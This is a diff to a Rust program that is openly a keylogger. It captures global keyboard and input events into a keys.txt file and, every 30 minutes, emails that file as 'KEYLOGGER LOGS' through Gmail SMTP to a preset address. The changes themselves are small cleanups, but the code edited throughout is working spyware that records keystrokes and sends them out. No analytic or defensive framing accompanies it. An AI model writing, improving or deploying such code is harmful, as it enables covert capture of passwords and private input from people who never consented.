@@ -8,23 +8,20 @@ use rdev::{Event, EventType, listen};
 use chrono::prelude::*;
 use lettre_email::EmailBuilder;
 use lettre_email::mime::TEXT_PLAIN;
-use lettre::{ClientSecurity, ClientTlsParameters, SmtpClient, SmtpTransport, Transport};
+use lettre::{SmtpClient, SmtpTransport, Transport};
 use lettre::smtp::authentication::Credentials;
-use lettre::smtp::client::ClientCodec;
 
 
 const FILENAME: &str = "keys.txt";
 
 struct Mail {
     smpt_server: String,
-    smpt_port: u32
 }
 
 impl Mail {
     pub fn new() -> Self {
         // GMAIL
         Mail {
-            smpt_port: 587u16 as u32,
             smpt_server: String::from("smtp.googlemail.com")
         }
     }
@@ -42,9 +39,11 @@ impl Mail {
             .body("KEYLOGGER LOGS")
             .text("here are the logs:")
             .attachment_from_file(path, Some(FILENAME), &mime)
-            .unwrap().build().unwrap();
+            .unwrap()
+            .build()
+            .unwrap();
         let mut mailer = SmtpTransport::new(SmtpClient::new_simple(self.smpt_server.as_str()).unwrap().credentials(Credentials::new(from.0, from.1)));
-        let a = mailer.send(email.clone().into()).unwrap();
+        mailer.send(email.clone().into()).unwrap();
         println!("EMAIL SENT");
     }
 }
@@ -72,12 +71,14 @@ impl ContentWrapper {
             }
         };
         let text = format!("[{}] {}\n", Utc::now(), ev_type);
-        self.file.lock().unwrap().write(text.as_bytes());
+        if let Err(e) = self.file.lock().unwrap().write(text.as_bytes()) {
+            println!("ERROR: {:?}", e);
+        }
     }
 }
 
 lazy_static! {
-    static ref file: ContentWrapper = ContentWrapper::new(FILENAME.to_string());
+    static ref FILE: ContentWrapper = ContentWrapper::new(FILENAME.to_string());
 }
 
 fn main() {
@@ -85,13 +86,14 @@ fn main() {
     std::thread::spawn(|| {
         let mailer = Mail::new();
         loop {
-            mailer.send_email(("youremail@gmail.com".to_string(), "yourpassword".to_string()), "emailtosendlogs@gmail.com".to_string());
             std::thread::sleep(Duration::from_secs(60 * 30));
+            mailer.send_email(("youremail@gmail.com".to_string(), "yourpassword".to_string()), "emailtosendlogs@gmail.com".to_string());
+
         }
     });
 
     if let Err(error) = listen(|e| {
-        file.write_event(e);
+        FILE.write_event(e);
     }) {
         println!("Error: {:?}", error)
     }
